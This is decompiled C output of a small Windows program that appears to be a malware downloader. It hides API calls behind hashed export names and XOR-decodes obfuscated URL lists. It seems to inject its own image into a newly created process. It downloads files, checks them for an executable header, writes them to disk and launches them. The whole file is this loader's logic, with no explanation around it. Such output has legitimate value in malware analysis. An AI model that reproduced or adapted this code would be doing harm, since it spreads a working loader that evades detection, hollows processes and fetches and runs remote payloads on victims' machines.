/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

void __noreturn sub_401000(); // weak
int sub_40125D();
int start();
int __stdcall sub_4015E8(int, int);
int __stdcall sub_4016B8(int);

//-------------------------------------------------------------------------
// Data declarations

char *off_403000[3] = { "exe ", "/", "open" }; // weak
char *off_403004[2] = { "/", "open" }; // weak
char *off_403008 = "open"; // weak
void *off_40300C = &unk_402101; // weak
void *off_403010 = &unk_4020FD; // weak
void *off_403014 = &unk_402075; // weak
void *off_403018 = &unk_402072; // weak
void *off_40301C = &unk_40206F; // weak
char *off_403020[15] =
{
  "J:",
  "ht",
  "\\",
  "in",
  "ne",
  "ost.",
  "l32.dll",
  "win",
  "dll",
  ":",
  "ker",
  "ch",
  "T",
  "shell32.dll",
  "E"
}; // weak
char *off_403024[14] =
{
  "ht",
  "\\",
  "in",
  "ne",
  "ost.",
  "l32.dll",
  "win",
  "dll",
  ":",
  "ker",
  "ch",
  "T",
  "shell32.dll",
  "E"
}; // weak
char *off_403028[13] =
{
  "\\",
  "in",
  "ne",
  "ost.",
  "l32.dll",
  "win",
  "dll",
  ":",
  "ker",
  "ch",
  "T",
  "shell32.dll",
  "E"
}; // weak
char *off_40302C[12] =
{
  "in",
  "ne",
  "ost.",
  "l32.dll",
  "win",
  "dll",
  ":",
  "ker",
  "ch",
  "T",
  "shell32.dll",
  "E"
}; // weak
char *off_403034[10] = { "ost.", "l32.dll", "win", "dll", ":", "ker", "ch", "T", "shell32.dll", "E" }; // weak
char *off_40303C[8] = { "win", "dll", ":", "ker", "ch", "T", "shell32.dll", "E" }; // weak
char *off_403040[7] = { "dll", ":", "ker", "ch", "T", "shell32.dll", "E" }; // weak
char *off_403044[6] = { ":", "ker", "ch", "T", "shell32.dll", "E" }; // weak
char *off_40304C[4] = { "ch", "T", "shell32.dll", "E" }; // weak
char *off_403050[3] = { "T", "shell32.dll", "E" }; // weak
char *off_403054[2] = { "shell32.dll", "E" }; // weak
char *off_403058 = "E"; // weak
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern HMODULE (__stdcall *LoadLibraryW)(LPCWSTR lpLibFileName);
// extern BOOL (__stdcall *SetFileSecurityA)(LPCSTR lpFileName, SECURITY_INFORMATION SecurityInformation, PSECURITY_DESCRIPTOR pSecurityDescriptor);
int (__stdcall *dword_403164)(_DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_403168)(_DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_40316C)(_DWORD) = NULL; // weak
int (*dword_403170)(void) = NULL; // weak
int (__stdcall *dword_403174)(_DWORD) = NULL; // weak
int (__stdcall *dword_403178)(_DWORD) = NULL; // weak
char byte_40317C[512] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // weak
char byte_40337C[512]; // weak
_UNKNOWN unk_40357C; // weak
int dword_40377C[]; // weak
CHAR Filename[260]; // idb
_UNKNOWN unk_403884; // weak
int dword_403988; // weak
int dword_4039B4; // weak
__int16 word_4039B8; // weak
int dword_4039CC; // weak
int dword_4039D0; // weak
int (__stdcall *dword_4039DC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_4039E0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_4039E4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int dword_4039E8; // weak
int dword_403AA0; // weak
int (__stdcall *dword_403CB4)(_DWORD, _DWORD); // weak
int (__stdcall *dword_403CB8)(_DWORD, _DWORD); // weak
int (__stdcall *dword_403CBC)(_DWORD); // weak
int (__stdcall *dword_403CC0)(_DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_403CC4)(_DWORD); // weak
int (__stdcall *dword_403CC8)(_DWORD); // weak
int (__stdcall *dword_403CCC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_403CD0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_403CD4)(_DWORD); // weak
int (__stdcall *dword_403CD8)(_DWORD, _DWORD); // weak
int (__stdcall *dword_403CDC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_403CE0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_403CE4)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_403CE8)(_DWORD); // weak
int (__stdcall *dword_403CEC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak


//----- (00401000) --------------------------------------------------------
void __noreturn sub_401000()
{
  LPSTR i; // ebx
  LPSTR v1; // ebx
  int v2; // esi
  int v3; // edi
  int v4; // ebx
  int v5; // esi
  int v6; // [esp+Ch] [ebp-40h]
  int v7; // [esp+14h] [ebp-38h]
  int v8; // [esp+18h] [ebp-34h]
  int v9; // [esp+1Ch] [ebp-30h]
  int v10; // [esp+20h] [ebp-2Ch]
  int v11; // [esp+24h] [ebp-28h]
  int v12; // [esp+28h] [ebp-24h]
  char v13[32]; // [esp+2Ch] [ebp-20h] BYREF

  dword_403164(v13, off_40303C[0]);
  dword_403168(v13, off_40302C[0]);
  dword_403168(v13, off_403010);
  dword_403168(v13, off_403040[0]);
  dword_40316C(v13);
  dword_40316C(off_403054[0]);
  dword_403170();
  for ( i = GetCommandLineA(); *i != 32; ++i )
    ;
  v1 = i + 1;
  v2 = 0;
  v3 = 0;
  do
  {
    if ( v3 )
      break;
    dword_403174(268);
    v3 = dword_403178(v1);
    ++v2;
  }
  while ( v2 <= 50 );
  v6 = 0;
  v4 = 0;
  v12 = 0;
  v5 = 0;
  do
  {
    byte_40317C[v5] = *((_BYTE *)off_403014 + v6 + 1) ^ *((_BYTE *)off_403014 + v6);
    if ( byte_40317C[v5] == 44 )
    {
      byte_40317C[v5] = 0;
      ++v12;
      v11 = 0;
      do
      {
        v10 = 0;
        v9 = 0;
        v8 = 0;
        v7 = 0;
        do
        {
          byte_40337C[v9] = off_403020[0][v10 + 1] ^ off_403020[0][v10];
          if ( byte_40337C[v9] == 44 )
          {
            byte_40337C[v9] = 0;
            dword_403164(&unk_40357C, off_403024[0]);
            dword_403168(&unk_40357C, off_40300C);
            dword_403168(&unk_40357C, off_403044[0]);
            dword_403168(&unk_40357C, off_403004[0]);
            dword_403168(&unk_40357C, off_403004[0]);
            dword_403168(&unk_40357C, byte_40317C);
            dword_403168(&unk_40357C, off_403004[0]);
            dword_403168(&unk_40357C, byte_40337C);
            if ( dword_40377C[v7] == 1 )
            {
              ++v8;
            }
            else if ( sub_4016B8((int)&unk_40357C) )
            {
              dword_40377C[v7] = 1;
              ++v8;
            }
            ++v7;
            v9 = -1;
          }
          ++v9;
          v10 += 3;
        }
        while ( v10 < 27 );
        if ( v8 == 1 )
          v4 = 1;
        ++v11;
        if ( !v4 )
          dword_403174(245547);
      }
      while ( v11 < 3 && !v4 );
      v5 = -1;
      if ( v4 )
        break;
    }
    ++v5;
    v6 += 3;
  }
  while ( v6 < 135 );
  ExitProcess(0);
}
// 401000: using guessed type void __noreturn sub_401000();
// 403004: using guessed type char *off_403004[2];
// 40300C: using guessed type void *off_40300C;
// 403010: using guessed type void *off_403010;
// 403014: using guessed type void *off_403014;
// 403020: using guessed type char *off_403020[15];
// 403024: using guessed type char *off_403024[14];
// 40302C: using guessed type char *off_40302C[12];
// 40303C: using guessed type char *off_40303C[8];
// 403040: using guessed type char *off_403040[7];
// 403044: using guessed type char *off_403044[6];
// 403054: using guessed type char *off_403054[2];
// 403164: using guessed type int (__stdcall *dword_403164)(_DWORD, _DWORD);
// 403168: using guessed type int (__stdcall *dword_403168)(_DWORD, _DWORD);
// 40316C: using guessed type int (__stdcall *dword_40316C)(_DWORD);
// 403170: using guessed type int (*dword_403170)(void);
// 403174: using guessed type int (__stdcall *dword_403174)(_DWORD);
// 403178: using guessed type int (__stdcall *dword_403178)(_DWORD);
// 40377C: using guessed type int dword_40377C[];

//----- (0040125D) --------------------------------------------------------
int sub_40125D()
{
  HMODULE ModuleHandleA; // ebx
  char *v1; // esi
  int v2; // eax
  char v4[4]; // [esp+Ch] [ebp-4h] BYREF

  GetModuleFileNameA(0, Filename, 0x104u);
  dword_403164(&unk_403884, off_403018);
  dword_403168(&unk_403884, off_40304C[0]);
  dword_403168(&unk_403884, off_403034[0]);
  dword_403168(&unk_403884, off_403000[0]);
  dword_403168(&unk_403884, Filename);
  dword_403988 = 68;
  dword_4039B4 = 1;
  word_4039B8 = 2;
  dword_4039DC(0, &unk_403884, 0, 0, 0, 4, 0, 0, &dword_403988, &dword_4039CC);
  ModuleHandleA = GetModuleHandleA(0);
  v1 = (char *)ModuleHandleA + *((_DWORD *)ModuleHandleA + 15);
  v2 = dword_4039E0(dword_4039CC, ModuleHandleA, *((_DWORD *)v1 + 20), 12288, 64);
  dword_4039E4(dword_4039CC, v2, ModuleHandleA, *((_DWORD *)v1 + 20), v4);
  dword_4039E8 = 65543;
  dword_403CB4(dword_4039D0, &dword_4039E8);
  dword_403AA0 = (int)sub_401000;
  dword_403CB8(dword_4039D0, &dword_4039E8);
  return dword_403CBC(dword_4039D0);
}
// 401000: using guessed type void __noreturn sub_401000();
// 403000: using guessed type char *off_403000[3];
// 403018: using guessed type void *off_403018;
// 403034: using guessed type char *off_403034[10];
// 40304C: using guessed type char *off_40304C[4];
// 403164: using guessed type int (__stdcall *dword_403164)(_DWORD, _DWORD);
// 403168: using guessed type int (__stdcall *dword_403168)(_DWORD, _DWORD);
// 403988: using guessed type int dword_403988;
// 4039B4: using guessed type int dword_4039B4;
// 4039B8: using guessed type __int16 word_4039B8;
// 4039CC: using guessed type int dword_4039CC;
// 4039D0: using guessed type int dword_4039D0;
// 4039DC: using guessed type int (__stdcall *dword_4039DC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4039E0: using guessed type int (__stdcall *dword_4039E0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4039E4: using guessed type int (__stdcall *dword_4039E4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4039E8: using guessed type int dword_4039E8;
// 403AA0: using guessed type int dword_403AA0;
// 403CB4: using guessed type int (__stdcall *dword_403CB4)(_DWORD, _DWORD);
// 403CB8: using guessed type int (__stdcall *dword_403CB8)(_DWORD, _DWORD);
// 403CBC: using guessed type int (__stdcall *dword_403CBC)(_DWORD);
// 40125D: using guessed type char var_4[4];

//----- (004013B0) --------------------------------------------------------
int start()
{
  HMODULE LibraryW; // ebx
  int v1; // ebx
  int v2; // eax
  char v4[32]; // [esp+4h] [ebp-20h] BYREF

  LibraryW = LoadLibraryW(L"kernel32.dll");
  dword_4039DC = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_4015E8((int)LibraryW, 1111071457);
  dword_4039E0 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_4015E8((int)LibraryW, -1632130944);
  dword_4039E4 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_4015E8((int)LibraryW, -1067629373);
  dword_403CB4 = (int (__stdcall *)(_DWORD, _DWORD))sub_4015E8((int)LibraryW, -1374413863);
  dword_403CB8 = (int (__stdcall *)(_DWORD, _DWORD))sub_4015E8((int)LibraryW, -1374407719);
  dword_403CBC = (int (__stdcall *)(_DWORD))sub_4015E8((int)LibraryW, -792678630);
  dword_403CC0 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))sub_4015E8((int)LibraryW, 827345528);
  dword_403CC4 = (int (__stdcall *)(_DWORD))sub_4015E8((int)LibraryW, 1053211448);
  dword_40316C = (int (__stdcall *)(_DWORD))sub_4015E8((int)LibraryW, 1675923463);
  dword_403168 = (int (__stdcall *)(_DWORD, _DWORD))sub_4015E8((int)LibraryW, 1945573565);
  dword_403164 = (int (__stdcall *)(_DWORD, _DWORD))sub_4015E8((int)LibraryW, 1945329213);
  dword_403CC8 = (int (__stdcall *)(_DWORD))sub_4015E8((int)LibraryW, 1914049981);
  dword_403174 = (int (__stdcall *)(_DWORD))sub_4015E8((int)LibraryW, 1663305742);
  dword_403170 = (int (*)(void))sub_4015E8((int)LibraryW, 551975043);
  dword_403178 = (int (__stdcall *)(_DWORD))sub_4015E8((int)LibraryW, 715546878);
  dword_403CCC = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_4015E8(
                                                                                              (int)LibraryW,
                                                                                              -1548852939);
  dword_403CD0 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_4015E8((int)LibraryW, -1536590696);
  dword_403CD4 = (int (__stdcall *)(_DWORD))sub_4015E8((int)LibraryW, -647487244);
  dword_403164(v4, off_40303C[0]);
  dword_403168(v4, off_40302C[0]);
  dword_403168(v4, off_403010);
  dword_403168(v4, off_403040[0]);
  v1 = dword_40316C(v4);
  dword_403CD8 = (int (__stdcall *)(_DWORD, _DWORD))sub_4015E8(v1, -1011431036);
  dword_403CDC = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_4015E8(v1, -1403965962);
  dword_403CE0 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_4015E8(v1, -1133230448);
  dword_403CE4 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_4015E8(v1, 505991828);
  dword_403CE8 = (int (__stdcall *)(_DWORD))sub_4015E8(v1, 233373895);
  v2 = dword_40316C(off_403054[0]);
  dword_403CEC = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_4015E8(v2, -217851720);
  sub_40125D();
  dword_403CC4(0);
  return 0;
}
// 403010: using guessed type void *off_403010;
// 40302C: using guessed type char *off_40302C[12];
// 40303C: using guessed type char *off_40303C[8];
// 403040: using guessed type char *off_403040[7];
// 403054: using guessed type char *off_403054[2];
// 403164: using guessed type int (__stdcall *dword_403164)(_DWORD, _DWORD);
// 403168: using guessed type int (__stdcall *dword_403168)(_DWORD, _DWORD);
// 40316C: using guessed type int (__stdcall *dword_40316C)(_DWORD);
// 403170: using guessed type int (*dword_403170)(void);
// 403174: using guessed type int (__stdcall *dword_403174)(_DWORD);
// 403178: using guessed type int (__stdcall *dword_403178)(_DWORD);
// 4039DC: using guessed type int (__stdcall *dword_4039DC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4039E0: using guessed type int (__stdcall *dword_4039E0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4039E4: using guessed type int (__stdcall *dword_4039E4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 403CB4: using guessed type int (__stdcall *dword_403CB4)(_DWORD, _DWORD);
// 403CB8: using guessed type int (__stdcall *dword_403CB8)(_DWORD, _DWORD);
// 403CBC: using guessed type int (__stdcall *dword_403CBC)(_DWORD);
// 403CC0: using guessed type int (__stdcall *dword_403CC0)(_DWORD, _DWORD, _DWORD);
// 403CC4: using guessed type int (__stdcall *dword_403CC4)(_DWORD);
// 403CC8: using guessed type int (__stdcall *dword_403CC8)(_DWORD);
// 403CCC: using guessed type int (__stdcall *dword_403CCC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 403CD0: using guessed type int (__stdcall *dword_403CD0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 403CD4: using guessed type int (__stdcall *dword_403CD4)(_DWORD);
// 403CD8: using guessed type int (__stdcall *dword_403CD8)(_DWORD, _DWORD);
// 403CDC: using guessed type int (__stdcall *dword_403CDC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 403CE0: using guessed type int (__stdcall *dword_403CE0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 403CE4: using guessed type int (__stdcall *dword_403CE4)(_DWORD, _DWORD, _DWORD, _DWORD);
// 403CE8: using guessed type int (__stdcall *dword_403CE8)(_DWORD);
// 403CEC: using guessed type int (__stdcall *dword_403CEC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (004015E8) --------------------------------------------------------
int __stdcall sub_4015E8(int a1, int a2)
{
  int v2; // esi
  int i; // edi
  unsigned int v4; // eax
  int v6; // [esp+Ch] [ebp-18h]
  int v7; // [esp+10h] [ebp-14h]
  _DWORD *v8; // [esp+14h] [ebp-10h]
  int v9; // [esp+20h] [ebp-4h]

  v2 = a2;
  v8 = (_DWORD *)(a1 + *(_DWORD *)(a1 + *(_DWORD *)(a1 + 60) + 120));
  v9 = a1 + v8[9];
  if ( SetFileSecurityA(0, 0, 0) )
    v2 = a2 + 349671;
  for ( i = 0; i < v8[6]; ++i )
  {
    v7 = a1 + *(_DWORD *)(a1 + v8[8] + 4 * i);
    v6 = 0;
    v4 = 0;
    while ( *(_BYTE *)(v6 + v7) )
    {
      v4 = *(char *)(v6 + v7) ^ 0xF4 ^ (((unsigned __int64)v4 >> 25) | (v4 << 7));
      ++v6;
    }
    if ( v4 == v2 )
      return a1 + *(_DWORD *)(a1 + v8[7] + 4 * *(unsigned __int16 *)(v9 + 2 * i));
  }
  return 0;
}

//----- (004016B8) --------------------------------------------------------
int __stdcall sub_4016B8(int a1)
{
  int v1; // esi
  int v2; // edi
  int i; // eax
  int v4; // ebx
  int v6; // [esp+Ch] [ebp-43Ch]
  int v7; // [esp+10h] [ebp-438h]
  int v8; // [esp+14h] [ebp-434h]
  int v9; // [esp+18h] [ebp-430h]
  char v10[1024]; // [esp+1Ch] [ebp-42Ch] BYREF
  char v11[32]; // [esp+41Ch] [ebp-2Ch] BYREF
  char v12[4]; // [esp+43Ch] [ebp-Ch] BYREF
  int v13; // [esp+440h] [ebp-8h] BYREF
  int v14; // [esp+444h] [ebp-4h] BYREF

  v14 = 7;
  v1 = 0;
  if ( dword_403CD8(&v14, 0) )
  {
    v8 = dword_403CDC(0, 0, 0, 0, 0);
    v2 = dword_403CE0(v8, a1, 0, 0, 0x80000000, 0);
    v1 = 0;
    if ( v2 )
    {
      for ( i = dword_403CC8(a1); i > 0; --i )
      {
        if ( *(_BYTE *)(i + a1) == 47 )
        {
          v9 = i + a1 + 1;
          break;
        }
      }
      dword_403164(v11, off_403050[0]);
      dword_403168(v11, off_403058);
      dword_403168(v11, off_40301C);
      dword_403CC0(v11, &unk_403884, 260);
      dword_403168(&unk_403884, off_403028[0]);
      dword_403168(&unk_403884, v9);
      v6 = dword_403CCC(&unk_403884, 0x40000000, 0, 0, 2, 0, 0);
      v7 = 0;
      v4 = 0;
      do
      {
        dword_403CE4(v2, v10, 1024, &v13);
        if ( !v4 )
        {
          v4 = 1;
          if ( v10[0] == 77 )
          {
            v4 = 1;
            if ( v10[1] == 90 )
            {
              v7 = 1;
              v4 = 1;
            }
          }
        }
        dword_403CD0(v6, v10, v13, v12, 0);
      }
      while ( v13 );
      dword_403CD4(v6);
      dword_403174(213);
      v1 = 0;
      if ( v7 )
      {
        dword_403CEC(0, off_403008, &unk_403884, 0, 0, 8);
        v1 = 1;
      }
    }
    dword_403CE8(v2);
    dword_403CE8(v8);
  }
  return v1;
}
// 4017A7: variable 'v9' is possibly undefined
// 403008: using guessed type char *off_403008;
// 40301C: using guessed type void *off_40301C;
// 403028: using guessed type char *off_403028[13];
// 403050: using guessed type char *off_403050[3];
// 403058: using guessed type char *off_403058;
// 403164: using guessed type int (__stdcall *dword_403164)(_DWORD, _DWORD);
// 403168: using guessed type int (__stdcall *dword_403168)(_DWORD, _DWORD);
// 403174: using guessed type int (__stdcall *dword_403174)(_DWORD);
// 403CC0: using guessed type int (__stdcall *dword_403CC0)(_DWORD, _DWORD, _DWORD);
// 403CC8: using guessed type int (__stdcall *dword_403CC8)(_DWORD);
// 403CCC: using guessed type int (__stdcall *dword_403CCC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 403CD0: using guessed type int (__stdcall *dword_403CD0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 403CD4: using guessed type int (__stdcall *dword_403CD4)(_DWORD);
// 403CD8: using guessed type int (__stdcall *dword_403CD8)(_DWORD, _DWORD);
// 403CDC: using guessed type int (__stdcall *dword_403CDC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 403CE0: using guessed type int (__stdcall *dword_403CE0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 403CE4: using guessed type int (__stdcall *dword_403CE4)(_DWORD, _DWORD, _DWORD, _DWORD);
// 403CE8: using guessed type int (__stdcall *dword_403CE8)(_DWORD);
// 403CEC: using guessed type int (__stdcall *dword_403CEC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4016B8: using guessed type char var_C[4];

// nfuncs=5 queued=5 decompiled=5 lumina nreq=0 worse=0 better=0
// ALL OK, 5 function(s) have been successfully decompiled
